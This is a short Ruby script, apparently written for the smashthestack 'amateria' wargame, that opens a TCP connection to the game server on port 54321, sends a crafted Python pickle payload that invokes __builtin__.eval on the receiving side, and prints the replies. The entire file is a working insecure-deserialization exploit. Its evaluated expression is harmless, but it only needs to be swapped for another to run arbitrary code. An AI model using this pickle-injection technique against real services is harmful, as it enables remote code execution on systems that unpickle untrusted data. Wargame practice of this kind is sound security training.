#!/usr/bin/ruby -w 
require "socket" 

#target = '127.0.0.1'
target = 'amateria.smashthestack.org' 
port = 54321 
payload = "c__builtin__\neval\n(S'(int(ord(\"h\")),0)'\ntR.)" 
sock = TCPSocket.open(target, port) 
sock.puts(payload) 
while readbuf = sock.gets     
	puts "REPLY IS:" + readbuf.chop   
end 
sock.close

